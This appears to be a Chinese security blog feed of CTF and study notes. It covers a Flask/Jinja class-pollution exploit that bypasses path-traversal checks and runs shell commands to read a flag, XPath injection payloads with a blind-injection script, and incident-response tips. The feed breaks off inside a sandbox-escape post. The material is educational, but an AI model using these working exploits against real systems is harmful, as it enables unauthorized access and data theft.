<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#app.py可以渲染url传入的路径名,但是只能在templates中搜索</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;templates/&quot;</span> + path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> render_template(path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_template_path</span>(<span class="params">template: <span class="built_in">str</span></span>) -&gt; t.<span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Split a path into segments and perform a sanity check.  If it detects</span></span><br><span class="line"><span class="string">    &#x27;..&#x27; in the path it will raise a `TemplateNotFound` error.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    pieces = []</span><br><span class="line">    <span class="keyword">for</span> piece <span class="keyword">in</span> template.split(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            os.sep <span class="keyword">in</span> piece</span><br><span class="line">            <span class="keyword">or</span> (os.path.altsep <span class="keyword">and</span> os.path.altsep <span class="keyword">in</span> piece)</span><br><span class="line">            <span class="keyword">or</span> piece == os.path.pardir</span><br><span class="line">        ):</span><br><span class="line">            <span class="keyword">raise</span> TemplateNotFound(template)</span><br><span class="line">        <span class="keyword">elif</span> piece <span class="keyword">and</span> piece != <span class="string">&quot;.&quot;</span>:</span><br><span class="line">            pieces.append(piece)</span><br><span class="line">    <span class="keyword">return</span> pieces</span><br></pre></td></tr></table></figure>

<p>可以看到jinja2通过 <code>os.path.pardir</code> 来对目录穿越进行了保护，我们可以通过修改 <code>pardir</code> 的值来绕过,payload如下:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;task&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.os.pardir&quot;</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="string">&quot;None&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>最终exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&#x27;http://127.0.0.1:1337&#x27;</span></span><br><span class="line">url      = <span class="string">f&#x27;<span class="subst">&#123;base_url&#125;</span>/api/manage_tasks&#x27;</span></span><br><span class="line">exp_url  = <span class="string">f&#x27;<span class="subst">&#123;base_url&#125;</span>/../../usr/local/lib/python3.8/turtle.py&#x27;</span></span><br><span class="line">app      = <span class="string">&#x27;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># add eval to template globals</span></span><br><span class="line">requests.post(url, json=&#123;<span class="string">&quot;task&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;app&#125;</span>.env&quot;</span>, <span class="string">&quot;status&quot;</span>: <span class="string">&quot;yolo&quot;</span>&#125;)</span><br><span class="line">requests.post(url, json=&#123;<span class="string">&quot;task&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;app&#125;</span>._got_first_request&quot;</span>, <span class="string">&quot;status&quot;</span>: <span class="literal">None</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># bypass jinja directory traversal check</span></span><br><span class="line">requests.post(url, json=&#123;<span class="string">&quot;task&quot;</span>: <span class="string">&quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.os.path.pardir&quot;</span>, <span class="string">&quot;status&quot;</span>: <span class="string">&quot;foobar&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># change jinja_env</span></span><br><span class="line">requests.post(url, json=&#123;<span class="string">&quot;task&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;app&#125;</span>.jinja_env.variable_start_string&quot;</span>, <span class="string">&quot;status&quot;</span>: <span class="string">&quot;&quot;&quot;&#x27;&quot;&quot;&#x27;]:\n            value = &quot;&quot;&quot;</span>&#125;)</span><br><span class="line">requests.post(url, json=&#123;<span class="string">&quot;task&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;app&#125;</span>.jinja_env.variable_end_string&quot;</span>, <span class="string">&quot;status&quot;</span>: <span class="string">&quot;\n&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add global vars</span></span><br><span class="line">requests.post(url, json=&#123;<span class="string">&quot;task&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;app&#125;</span>.jinja_env.globals.value&quot;</span>, <span class="string">&quot;status&quot;</span>: <span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag-*.txt&#x27;).read()&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get flag</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = requests.Request(method=<span class="string">&#x27;GET&#x27;</span>, url=exp_url)</span><br><span class="line">p = r.prepare()</span><br><span class="line">p.url = exp_url</span><br><span class="line">r = s.send(p)</span><br><span class="line">flag = re.findall(<span class="string">&#x27;idek&#123;.*&#125;&#x27;</span>, r.text)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>



<p>参考:<a href="https://tttang.com/archive/1876/#toc__9">https://tttang.com/archive/1876/#toc__9</a></p>
]]></content>
      <categories>
        <category>web漏洞</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Xpath注入</title>
    <url>/2025/06/22/xpath%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>当XML文件被用于用户验证之类，且对用户输入没有限制，就可以注入访问XML文档</p>
<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><p>Xpath中XML文档被当作节点树对待，通过路径表达式来选取节点</p>
<table>
<thead>
<tr>
<th>表达式</th>
<th>描述</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>nodename</td>
<td>选取此节点的所有子节点</td>
<td></td>
</tr>
<tr>
<td>&#x2F;</td>
<td>从根节点选取</td>
<td></td>
</tr>
<tr>
<td>&#x2F;&#x2F;</td>
<td>从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置</td>
<td></td>
</tr>
<tr>
<td>.</td>
<td>选取当前节点</td>
<td></td>
</tr>
<tr>
<td>..</td>
<td>选取当前节点的父节点</td>
<td></td>
</tr>
<tr>
<td>@</td>
<td>选取属性或　@*：匹配任何属性节点</td>
<td></td>
</tr>
<tr>
<td>*</td>
<td>匹配任何元素节点</td>
<td></td>
</tr>
<tr>
<td>@*</td>
<td>匹配任何属性节点</td>
<td></td>
</tr>
<tr>
<td>node()</td>
<td>匹配任何类型的节点</td>
<td></td>
</tr>
<tr>
<td>|</td>
<td>计算两个节点集</td>
<td></td>
</tr>
<tr>
<td>or&#x2F;and</td>
<td>返回true&#x2F;false</td>
<td></td>
</tr>
<tr>
<td>运算符</td>
<td>返回结果</td>
<td></td>
</tr>
<tr>
<td>&gt;&#x2F;&lt;&#x2F;&#x3D;之类</td>
<td>返回true&#x2F;false</td>
<td></td>
</tr>
</tbody></table>
<p>例：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bookstore</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">book</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">&quot;eng&quot;</span>&gt;</span>Harry Potter<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">price</span>&gt;</span>29.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">book</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">&quot;eng&quot;</span>&gt;</span>Learning XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">price</span>&gt;</span>39.95<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">bookstore</span>&gt;</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>表达式</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>&#x2F;bookstore&#x2F;book[1]</td>
<td>选取属于 bookstore 子元素的第一个 book 元素</td>
</tr>
<tr>
<td>&#x2F;bookstore&#x2F;book[last()]</td>
<td>选取属于 bookstore 子元素的最后一个 book 元素</td>
</tr>
<tr>
<td>&#x2F;&#x2F;title[@lang]</td>
<td>选取所有拥有名为 lang 的属性的 title 元素</td>
</tr>
<tr>
<td>&#x2F;&#x2F;title[@lang&#x3D;’eng’]</td>
<td>选取所有 title 元素，且这些元素拥有值为 eng 的 lang 属性</td>
</tr>
<tr>
<td>&#x2F;bookstore&#x2F;book[price&gt;35.00]&#x2F;title</td>
<td>选取 bookstore 元素中的 book 元素的所有 title 元素，且其中的 price 元素的值须大于 35.00</td>
</tr>
<tr>
<td>&#x2F;bookstore&#x2F;*</td>
<td>选取 bookstore 元素的所有子元素</td>
</tr>
<tr>
<td>&#x2F;&#x2F;*</td>
<td>选取文档中的所有元素</td>
</tr>
<tr>
<td>&#x2F;&#x2F;title[@*]</td>
<td>选取所有带有属性的 title 元素</td>
</tr>
<tr>
<td>&#x2F;&#x2F;title|&#x2F;&#x2F;price</td>
<td>选取所有title和price元素</td>
</tr>
</tbody></table>
<h1 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h1><ul>
<li><p>?name&#x3D;fake’ or ‘1’or’1&amp;pwd&#x3D;fake’or ‘1’or’1</p>
<p>or绕过用户名和密码</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$pwd</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pwd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;/root/users/user[username/text()=&#x27;&quot;</span>.<span class="variable">$name</span>.<span class="string">&quot;&#x27; and password/text()=&#x27;&quot;</span>.<span class="variable">$pwd</span>.<span class="string">&quot;&#x27;]&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$query</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$xml</span>-&gt;<span class="title function_ invoke__">xpath</span>(<span class="variable">$query</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>?user&#x3D;’]|&#x2F;&#x2F;*|ss[‘</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">$query=&quot;user/username[@name=&#x27;&quot;.$user.&quot;&#x27;]&quot;;</span><br></pre></td></tr></table></figure>
</li>
<li><p>盲注：</p>
<p>使用函数如下：</p>
<p><img src="D:\code\记录\图片\40b74b6b-104c-46e3-804a-809405809dde.png"></p>
</li>
</ul>
<p>​	      一般步骤如下：</p>
<p>​	      判断节点下节点数→猜测第一级节点</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">#猜测根节点下节点数</span><br><span class="line">127.0.0.1/xpath/index.php?name=1&#x27; or count(/*)=1 or &#x27;1&#x27;=&#x27;1&amp;pwd=fake</span><br><span class="line"></span><br><span class="line">#猜测第一级节点(获取元素名称 name(),[position()=1]：显式指定选择第一个节点)</span><br><span class="line">127.0.0.1/xpath/index.php?name=1&#x27; or substring(name(/*[position()=1]),1,1)=&#x27;r&#x27; or &#x27;1&#x27;=&#x27;1&amp;pwd=fake</span><br><span class="line">127.0.0.1/xpath/index.php?name=1&#x27; or substring(name(/*[position()=1]),2,1)=&#x27;o&#x27; or &#x27;1&#x27;=&#x27;1&amp;pwd=fake</span><br><span class="line"></span><br><span class="line">#猜测username元素值</span><br><span class="line">127.0.0.1/xpath/index.php?name=1&#x27; or substring(/root/users/user[id=1]/username,1,1)=&#x27;a&#x27; or &#x27;1&#x27;=&#x27;1&amp;pwd=fake</span><br></pre></td></tr></table></figure>

<p>脚本如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xpath_blind_injection</span>():</span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1:5000/vulnerable&quot;</span></span><br><span class="line">    base_path = <span class="string">&quot;/*&quot;</span>  <span class="comment"># 要探测的XPath路径</span></span><br><span class="line">    found_nodes = []</span><br><span class="line">    rep=<span class="string">&quot;User exists&quot;</span></span><br><span class="line">    <span class="comment"># 扩展字符集并按ASCII排序</span></span><br><span class="line">    chars = <span class="built_in">sorted</span>(string.ascii_letters)  <span class="comment"># 覆盖常见节点名称字符</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 使用字符集: <span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join(chars)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ====== 第一阶段：探测子节点数量 ======</span></span><br><span class="line">    max_nodes = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">        <span class="comment"># 构造闭合语句确保XPath语法正确</span></span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27; and count(<span class="subst">&#123;base_path&#125;</span>)=<span class="subst">&#123;num&#125;</span> and &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[INFO] <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(url, params=params, timeout=<span class="number">8</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[INFO] <span class="subst">&#123;response&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> rep <span class="keyword">in</span> response.text:  <span class="comment"># 根据实际成功条件修改</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] Found <span class="subst">&#123;num&#125;</span> nodes under <span class="subst">&#123;base_path&#125;</span>&quot;</span>)</span><br><span class="line">                max_nodes = num</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] 请求失败: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment"># ====== 第二阶段：枚举节点名称 ======</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_nodes + <span class="number">1</span>):</span><br><span class="line">        node_name = []</span><br><span class="line">        current_path = <span class="string">f&quot;<span class="subst">&#123;base_path&#125;</span>[position()=<span class="subst">&#123;pos&#125;</span>]&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[+] 正在探测第 <span class="subst">&#123;pos&#125;</span> 个节点名称...&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 按字符位置逐位猜测</span></span><br><span class="line">        <span class="keyword">for</span> char_pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">21</span>):  <span class="comment"># 假设名称最长20字符</span></span><br><span class="line">            low, high = <span class="number">0</span>, <span class="built_in">len</span>(chars) - <span class="number">1</span></span><br><span class="line">            found_char = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> current_char <span class="keyword">in</span> chars:</span><br><span class="line">                payload = (</span><br><span class="line">                    <span class="string">f&quot;admin&#x27; and substring(name(<span class="subst">&#123;current_path&#125;</span>),&quot;</span></span><br><span class="line">                    <span class="string">f&quot;<span class="subst">&#123;char_pos&#125;</span>,1)=&#x27;<span class="subst">&#123;current_char&#125;</span>&#x27; and &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    response = requests.get(url, params=&#123;<span class="string">&quot;name&quot;</span>: payload&#125;)</span><br><span class="line">                    <span class="keyword">if</span> rep <span class="keyword">in</span> response.text:</span><br><span class="line">                        found_char = current_char</span><br><span class="line">                        <span class="keyword">break</span>  <span class="comment"># 向左查找更小字符</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">continue</span>  <span class="comment"># 向右查找更大字符</span></span><br><span class="line">                <span class="keyword">except</span> requests.exceptions.RequestException:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> found_char:</span><br><span class="line">                node_name.append(found_char)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;位置 <span class="subst">&#123;char_pos&#125;</span>: <span class="subst">&#123;found_char&#125;</span>&quot;</span>, end=<span class="string">&quot;\r&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span>  <span class="comment"># 该位置无有效字符</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> node_name:</span><br><span class="line">            full_name = <span class="string">&quot;&quot;</span>.join(node_name)</span><br><span class="line">            found_nodes.append(full_name)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n[+] 节点 <span class="subst">&#123;pos&#125;</span> 名称: <span class="subst">&#123;full_name&#125;</span>&quot;</span>)</span><br><span class="line">            current_path = <span class="string">f&quot;<span class="subst">&#123;base_path&#125;</span>/<span class="subst">&#123;full_name&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ====== 结果输出 ======</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[+] 探测完成！发现以下节点：&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> idx, name <span class="keyword">in</span> <span class="built_in">enumerate</span>(found_nodes, <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;节点 <span class="subst">&#123;idx&#125;</span>: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    xpath_blind_injection()</span><br></pre></td></tr></table></figure>



<p>参考：<a href="https://www.cnblogs.com/backlion/p/8554749.html">https://www.cnblogs.com/backlion/p/8554749.html</a></p>
]]></content>
      <categories>
        <category>web漏洞</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title>应急响应常见题目</title>
    <url>/2025/06/10/%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E9%A2%98%E5%9E%8B%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<h1 id="找被修改的密码"><a href="#找被修改的密码" class="headerlink" title="找被修改的密码"></a>找被修改的密码</h1><ul>
<li><p>可疑命令</p>
<p><code>history</code>,审计日志<code>/var/log/secure</code>,<code>/www/</code></p>
</li>
<li><p>可疑程序</p>
<p><code>netstat -adopt</code></p>
</li>
<li><p>查看<code>/temp</code>文件夹，是否有可疑文件</p>
</li>
<li><p>如果有数据库(mysql)</p>
<p>找配置文件(config.inc.php)获取账号密码</p>
<p>登录数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -ukaoshi -p5Sx8mK5ieyLPb84m</span><br><span class="line">show databases;</span><br><span class="line">use kaoshi; #切到kaoshi库</span><br><span class="line">show tables;</span><br><span class="line">select * from jdsklfja;</span><br></pre></td></tr></table></figure>

</li>
<li><p>找流量包，看post发的数据</p>
</li>
</ul>
<h1 id="钓鱼邮件"><a href="#钓鱼邮件" class="headerlink" title="钓鱼邮件"></a>钓鱼邮件</h1><p>邮件记事本打开，可以看到发信人的ip，一般最后一个ip是的</p>
<p><img src="/../images/3551469-20250228130850727-760442515.png" alt="img"></p>
<h1 id="找后门用户"><a href="#找后门用户" class="headerlink" title="找后门用户"></a>找后门用户</h1><ul>
<li>分析log文件<code>grep &#39;new user&#39;</code></li>
<li>审计&#x2F;etc&#x2F;passwd 注意和<code>root:x:0:0:root:/root:/bin/bash</code>相似的用户</li>
<li>在流量包中搜索<code>id</code></li>
<li>以通过<code>ps -aux</code>查看是否有可疑用户启动的进程</li>
</ul>
<h1 id="数据库加密"><a href="#数据库加密" class="headerlink" title="数据库加密"></a>数据库加密</h1><p>先用np连接数据库，找出被加密的数据库文件</p>
<p><img src="/../images/840b7daac21036e7c0cc9c465750d4bc.png" alt="840b7daac21036e7c0cc9c465750d4bc"></p>
<p>利用时间线索，找上传的木马文件和数据库文件被修改之间的文件</p>
<p><code>find / -type f -newer /var/www/html/plugins/cpg.php ! -newer /var/lib/mysql/JPMorgan@0020Chase/Balance.frm</code></p>
<p>再排查可疑文件(php文件……)</p>
<p>比如下表</p>
<p><img src="/../images/image-20250606001923460.png" alt="image-20250606001923460"></p>
<p>写个解密脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$currentDate</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d&quot;</span>);  </span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;2023-11-18&#x27;</span>);  </span><br><span class="line"><span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">hash</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="string">&quot;DeepMountainsGD&quot;</span>), <span class="number">0</span>, <span class="number">16</span>);  </span><br><span class="line"><span class="variable">$filePath</span> = <span class="string">&quot;/var/lib/mysql/JPMorgan@0020Chase&quot;</span>;  </span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$filePath</span>);  </span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> != <span class="string">&quot;.&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;..&quot;</span>) &#123;  </span><br><span class="line">                    <span class="variable">$fullPath</span> = <span class="variable">$filePath</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file</span>;  </span><br><span class="line">                        <span class="variable">$encryptedContent</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$fullPath</span>);  </span><br><span class="line">                        <span class="variable">$decryptedContent</span> = <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$encryptedContent</span>, <span class="string">&#x27;aes-256-cbc&#x27;</span>, <span class="variable">$key</span>, <span class="number">0</span>, <span class="variable">$iv</span>);  </span><br><span class="line">                            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$fullPath</span>, <span class="variable">$decryptedContent</span>);  </span><br><span class="line">                        &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用<code>php 1.php</code>运行</p>
<p>再<code>sudo systemctl restart mysql</code>重启一下数据库,最后刷新一下</p>
<h1 id="查看黑客篡改的命令"><a href="#查看黑客篡改的命令" class="headerlink" title="查看黑客篡改的命令"></a>查看黑客篡改的命令</h1><ul>
<li><p>审查各种日志文件</p>
</li>
<li><p><code>history</code>命令</p>
</li>
<li><p><code>ps -aux</code>查看进程</p>
</li>
<li><p><code>crontab -l</code>查看启动项</p>
</li>
<li><p>检查系统中的关键命令,可以看看$PATH,看权限设置是否正常<code>ls -la</code>（如<code>/bin</code>、<code>/sbin</code>、<code>/usr/bin</code>等目录下的命令）</p>
</li>
<li><p>检查文件完整性,时间戳和哈希值</p>
<p><code>find / -type f -newer xx</code></p>
</li>
</ul>
<h1 id="寻找被攻击端口"><a href="#寻找被攻击端口" class="headerlink" title="寻找被攻击端口"></a>寻找被攻击端口</h1><ul>
<li>使用命令查找可疑端口</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsof -i -P -n <span class="comment">#查看活跃端口</span></span><br><span class="line">ss -lnup <span class="comment">#进行查看被监听的端口</span></span><br><span class="line">netsh interface portproxy show all <span class="comment">#端口转发规则</span></span><br></pre></td></tr></table></figure>

<ul>
<li>wireshark中筛选攻击ip,统计端点,按分组排序,在tcp一栏看端口号</li>
<li>windows <code>4624</code>看端口号</li>
</ul>
<h1 id="查找注入代码的工具"><a href="#查找注入代码的工具" class="headerlink" title="查找注入代码的工具"></a>查找注入代码的工具</h1><p>注意隐藏文件和&#x2F;opt文件,后者用于存放第三方软件和应用程序</p>
<p>常见的注入工具:</p>
<ul>
<li>SQL注入:SQLMap&#x2F;Havij&#x2F;SQLNinja&#x2F;JSQL Injection&#x2F;Burp Suite</li>
<li>命令注入:Commix</li>
<li>多种注入:Metasploit&#x2F;W3af</li>
<li>后门工具:Cymothoa</li>
<li>浏览器:BeEF</li>
</ul>
<p>另:</p>
<blockquote>
<p>使用命令运行 .&#x2F;x.xx 执行该文件 将查询的 Exec****** 值 作为flag提交 flag{&#x2F;xxx&#x2F;xxx&#x2F;xxx}</p>
</blockquote>
<p>指的是运行&#x2F;x.xx文件实际运行的软件路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#先运行一下,或者通过文件开头的#!usr/bin/python3</span></span><br><span class="line">python3 /tmp/.temp/libprocesshider/1.py</span><br><span class="line">netstat -anipt <span class="comment">#查看是否成功运行</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">which</span> python3 <span class="comment">#查看python路径</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> -la /usr/bin/python3 <span class="comment">#查看文件详细信息</span></span><br><span class="line"><span class="comment">#结果如下</span></span><br><span class="line">lrwxrwxrwx. 1 root root 9 Mar 23 2014 /usr/bin/python3 -&gt; python3.4</span><br><span class="line"><span class="comment">#说明python3是软连接指向python3.4</span></span><br><span class="line"><span class="comment">#所以最终flag&#123;/usr/bin/python3.4&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="判断攻击者成功"><a href="#判断攻击者成功" class="headerlink" title="判断攻击者成功"></a>判断攻击者成功</h1><ul>
<li>查找关键词：pwd&#x2F;whoami，查找特殊符号：?</li>
<li>登录页面找302跳转，跳转后可能是welcome.php之类网站</li>
<li>查看浏览器标头，如果是过时浏览器也可能代表成功</li>
</ul>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title>沙箱逃逸</title>
    <url>/2025/06/22/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><ul>
<li><p>eval(expression,[globals], [locals]) </p>
<p>执行单个表达式，会返回结果</p>
</li>
<li><p>exec(expression,[globals], [locals])</p>
<p>可执行多行代码，不会返回结果</p>
</li>
</ul>
<h2 id="类继承链"><a href="#类继承链" class="headerlink" title="类继承链"></a>类继承链</h2><h3 id="常见方法"><a href="#常见方法" class="headerlink" title="常见方法:"></a>常见方法:</h3><table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">属性</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>__class__</code></td>
<td align="left">返回类</td>
</tr>
<tr>
<td align="left"><code>__bases__</code></td>
<td align="left">返回基类,所有类的根基类是 <code>object</code>,通过 <code>object</code> 类可以访问所有继承自它的子类</td>
</tr>
<tr>
<td align="left"><code>__subclasses__</code></td>
<td align="left">返回对象的所有直接子类列表</td>
</tr>
<tr>
<td align="left"><code>__init__</code></td>
<td align="left">构造函数,初始化对象属性</td>
</tr>
